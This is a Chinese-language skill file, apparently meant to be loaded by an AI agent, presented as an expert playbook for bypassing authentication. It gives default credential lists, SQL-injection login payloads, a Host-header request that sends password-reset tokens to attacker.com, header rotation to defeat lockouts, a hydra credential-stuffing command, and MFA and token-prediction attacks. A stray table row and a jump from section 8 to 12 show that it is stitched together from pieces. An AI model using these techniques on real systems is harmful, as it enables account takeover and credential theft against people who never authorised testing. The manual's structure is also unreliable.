# 技能：身份验证绕过——专家攻击手册

> **AI 加载指令**：专家级身份验证绕过技术。涵盖基于 SQL 注入的登录绕过、密码重置漏洞、令牌可预测性、账户枚举、暴力破解绕过和多因素认证绕过。与 JWT/OAuth（在 ../jwt-oauth-token-attacks/SKILL.md 中涵盖）不同。专注于登录机制本身。

## 0. 授权凭证测试规划

在减少路由条目、默认凭证、用户名变体、端口焦点和单词列表大小后，这些处理都在这里集中处理。

### 服务优先的极小集合

| 服务类型 | 首次用户名 | 首次密码 |
|---|---|---|
| phpMyAdmin | `root`, `admin` | 空白, `root`, `phpmyadmin`, `admin` |
| FTP | `ftp`, `admin`, `test` | 空白, `ftp`, `admin`, `123456` |
| SSH | `root`, `admin`, 服务账户名称 | `root`, `admin`, 季节性变体 |
| MySQL | `root`, `mysql` | 空白, `root`, `mysql` |
| Tomcat / Java 管理员 | `tomcat`, `admin`, `manager` | `tomcat`, `admin`, `s3cret` |
| WebLogic | `weblogic`, `admin` | `weblogic`, `welcome1`, `admin` |

### 用户名类别

| 类别 | 示例 |
|---|---|
| 通用管理员 | `admin`, `administrator`, `root`, `test`, `guest` |
| 支持 / 运维 | `dev`, `ops`, `sysadmin`, `service`, `backup` |
| 基于名称 | `firstname`, `lastname`, `f.lastname`, `first.last` |
| 邮箱衍生 | 企业邮箱格式的左侧 |
| 产品衍生 | `tomcat`, `weblogic`, `jenkins`, `gitlab` |

### 单词列表大小和端口焦点

| 场景 | 推荐大小 | 原因 |
|---|---|---|
| 默认管理员面板 | 5 到 50 个密码 | 默认值在这里优于巨大的列表 |
| 已知产品的内部服务 | 供应商特定的较小集合 | 比通用列表有更好的信号 |
| 控制薄弱的消费登录 | 顶部 20 或 100 | 快速验证 |
| 速率限制登录 | 微小列表 + 头部/旋转策略 | 保留尝试次数 |
| 离线哈希破解 | 大型字典 | 在线暴力破解规则不适用 |

优先考虑常见端口和服务表面：80/443/8080/8443 管理员面板、22 SSH、21 FTP 和 3306/5432/6379/27017 数据或管理服务。

## 1. SQL 注入登录绕过

经典但仍然存在于遗留系统、自定义 ORM 和原始查询代码中：

```sql
-- 基本绕过（假设管理员用户在第一行）：
用户名：admin'--
密码：任何内容
→ 查询：SELECT * FROM users WHERE user='admin'--' AND pass='任何内容'

-- 通用绕过（登录为数据库中的第一个用户）：
用户名：' OR '1'='1'--
密码：任何内容
→ 查询：SELECT * FROM users WHERE user='' OR '1'='1'--' AND pass='任何内容'

-- 盲测：这个有效吗？
用户名：' OR 1=1--
用户名：admin' OR 'a'='a
用户名：1' OR '1'='1'/*
用户名：1 or 1=1
```

**分别测试每个字段**—— 只有一个字段可能存在漏洞。

## 2. 密码重置漏洞

### 可预测的/可预测的重置令牌

检查重置令牌是否基于：
```
- 时间戳：token=1691234567890（Unix 时间）
- 顺序：token=1001, 1002, 1003
- MD5(email)：echo -n "user@example.com" | md5sum
- MD5(username+timestamp)：可逆
- 短令牌（4-6 位数字）：可暴力破解
```

**测试**：请求 3 个连续的重置邮件，比较令牌模式。

### 重置令牌不过期
```
1. 请求密码重置 → 通过邮件获取令牌
2. 等待 48+ 小时（令牌应过期）
3. 使用旧令牌 → 是否有效？
```

### 重置令牌重复使用
```
1. 请求重置 → 获取令牌 T1
2. 使用 T1 完成重置
3. 再次使用 T1 → 是否再次有效？
```

### 重置邮件中的主机头注入
当应用程序使用 `Host` 头生成重置 URL 时：
```http
POST /forgot-password HTTP/1.1
Host: attacker.com           ← 注入攻击者的域
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
→ 重置邮件发送到受害者，链接指向 `attacker.com/reset?token=VICTIM_TOKEN`
→ 受害者点击 → 令牌被攻击者捕获

**测试**：使用修改后的 `Host:` 发送密码重置，检查邮件重置链接指向哪里。

### 重置令牌在 Referer 中
```
1. 请求重置 → 跳转到带有令牌的重置 URL
2. 重置页面加载第三方资源（分析、字体）
→ Referer 头部泄露：https://target.com/reset?token=TOKEN
→ 第三方服务器在日志中接收令牌
```

### 无需当前密码的密码更改
```
PUT /api/user/password
{"new_password": "hacked"}
→ 不需要当前密码字段？
→ 与 CSRF 结合进行账户接管
```

## 3. 账户枚举

识别有效的用户名/邮箱可以启用针对性攻击：

### 错误消息差异
```
无效用户名 → "用户未找到"
有效用户名，密码错误 → "密码错误"
→ 枚举有效账户
```

### 响应时间差异
```
无效用户名 → 快速响应（无数据库查询）
有效用户名 → 稍慢（数据库查询 + 哈希比较）
→ 定时器预言机
```

### 密码重置流程
```
POST /forgot-password {"email": "nonexistent@example.com"}
→ "如果此邮箱存在，我们已发送重置链接"（正确）
vs.
→ "此邮箱未注册"（枚举可能）
```

### 注册端点
```
POST /register {"email": "victim@example.com"}
→ "邮箱已注册" → 确认账户存在
vs.
→ "已发送验证邮件" 对两者都适用 → 无枚举
```

## 4. 暴力破解绕过

### N 次尝试后锁定然后重置
```
10 次尝试后锁定 → 尝试 9 个错误密码 → 锁定
等待重置周期（通常是 30 分钟或 1 小时）
→ 尝试 9 个更多 → 重复 → 无永久锁定
```

### 基于 IP 的锁定绕过
```
X-Forwarded-For: 1.1.1.1       ← 每个请求更改
X-Real-IP: 2.2.2.2
在头部轮换 IP
```

### 用户名循环与密码循环
```
正常暴力破解：为一个用户尝试许多密码 → 锁定
反向暴力破解：对一个密码尝试许多用户
→ "password123" 对所有用户 → 找到那些密码较弱的用户
→ 无单个账户锁定
```

### 凭证填充
使用 HaveIBeenPwned 数据集中的被盗凭证对目标：
```bash
# 工具：Hydra, Burp Intruder, 自定义脚本
hydra -C credentials.txt https-post-form://target.com/login:"username=^USER^&password=^PASS^":"error message"
```

## 5. 多因素认证绕过

### 2FA 完成前的会话 Cookie
```
流程：登录（密码正确）→ 重定向到 2FA 页面 → 输入代码
攻击：密码步骤后，会话 Cookie 被设置，但 2FA 尚未检查。
→ 使用会话 Cookie 直接访问 /dashboard
→ 完全跳过 2FA 页面
```

### 2FA 代码暴力破解
```
4-6 位 TOTP 代码 = 最大 1,000,000 种可能性
如果 2FA 步骤无锁定：
→ 暴力破解所有代码（工具：Burp Intruder, 顺序）
→ TOTP 窗口：30 秒窗口，一些接受前一个/下一个窗口
```

### 2FA 在关键操作上而不是登录上
```
登录不需要 2FA，但：
DELETE /account 或 POST /transfer 需要 2FA
攻击：2FA 是否在这些操作上检查，还是仅在登录上？
→ 如果仅在登录：登录一次 → 无需验证 2FA 的操作
```

### 2FA 备用代码滥用
```
生成备用代码（通常 8-10 个一次性使用）
测试：
→ 备用代码是否速率限制？
→ 备用代码可以多次使用吗？
→ 短代码（6-8 个字符）？如果没有速率限制，则暴力破解
```

### 2FA 代码重复使用
```
TOTP 代码仅使用一次
→ 使用相同的 TOTP 代码两次 → 第二次是否有效？
→ 重放攻击如果服务器不跟踪已使用的代码
```

## 6. OAUTH / SSO 账户接管模式

### 邮箱声明信任
```
1. 在攻击者控制的 OAuth 提供商处创建账户
2. 设置邮箱声明 = victim@target.com
3. 通过该提供商链接/登录
→ 如果服务器信任邮箱声明而不进行验证 → 账户合并/接管
```

### 密码在 SSO 链接后不适用
```
1. 用户通过 Google SSO 链接
2. 用户忘记密码（账户在仅 SSO 后没有密码设置）
3. "忘记密码"流程 → 即使对于仅 SSO 账户也会重置密码？
→ 可以设置密码 → 现在绕过 SSO → 直接登录
```

## 7. 用户名/密码字段操作

### 长密码 DoS → 绕过
```
某些应用程序在发送到数据库之前对密码进行哈希处理。
bcrypt 有 72 字节限制——输入超过 72 字节会被忽略。
攻击：
→ 使用密码 "A"*100 注册
→ 使用密码 "A"*72 登录 → 相同哈希 → 有效
→ 使用 "A"*71 + "totally different" → 如果截断 → 如果前 72 个字符匹配，则相同哈希
```

### 用户名中的空字节
```
username=admin%00 vs username=admin
→ 某些字符串比较中的空字节截断
→ "admin\0attacker" = "admin" 在 C 字符串比较中
```

### Unicode 规范化
```
用户名："ⓢcott" → 规范化为 "scott" → 伪装 "scott"
用户名：`admin`（字母的各种 Unicode 同形异体）
```

## 8. 会话管理漏洞

### 退出时未使会话失效
```
1. 登录 → 捕获会话 Cookie
2. 退出
3. 重放捕获的会话 Cookie → 仍然有效？
→ 会话未在服务器端失效
```

### 权限变更时未重新生成会话
```
1. 登录为低权限 → 获取会话 Cookie
2. 管理员升级你的角色
3. 旧的会话 Cookie 现在具有管理员访问权限？
→ 会话未重新生成 → 旧令牌继承新权限
```

### 可预测的会话令牌
```
令牌：base64(userid+timestamp) → 可逆
令牌：顺序整数 → 会话 ID= your_session_id -/+ 小数
令牌：短随机（32 位熵）→ 可暴力破解
```

| 20 | 令牌生成竞态条件 | 多个并发请求生成相同令牌 |

## 12. 不安全的随机性——令牌预测

### UUID v1（基于时间 — 可预测！）

```
UUID v1 格式：timestamp-clock_seq-node(MAC)
# MAC 地址通常通过其他端点泄露
# 时间戳是自 1582-10-15 以来 100ns 间隔
# 工具：guidtool（从已知时间戳范围重建可能的 UUIDs）
```

### MongoDB ObjectId

```
ObjectId = 4 字节时间戳 + 5 字节随机 + 3 字节计数器
# 前 4 字节 = Unix 时间戳 → 创建时间泄露
# 计数器是顺序的 → 相邻 ObjectId 可预测
# 如果你知道一个 ObjectId，附近的可以计算
```

### PHP uniqid()

```php
uniqid() = hex(microtime)
// 输出：5f3e7a4c1d2b3
// 完全基于当前微秒时间戳
// 如果你知道大约服务器时间，则可预测
```

### PHP mt_rand() 恢复

```
# mt_rand() 使用梅森旋转算法生成器
# 观察 ~624 个输出后，完整内部状态可恢复
# 工具：openwall/php_mt_seed
# 输入已知输出 → 恢复种子 → 预测所有未来值
```

### 工具

- `guidtool` — UUID v1 重建
- `AethliosIK/reset-tolkien` — 自动化密码重置令牌预测
- `openwall/php_mt_seed` — PHP mt_rand 种子恢复
- `sandwich` — 令牌时间戳分析
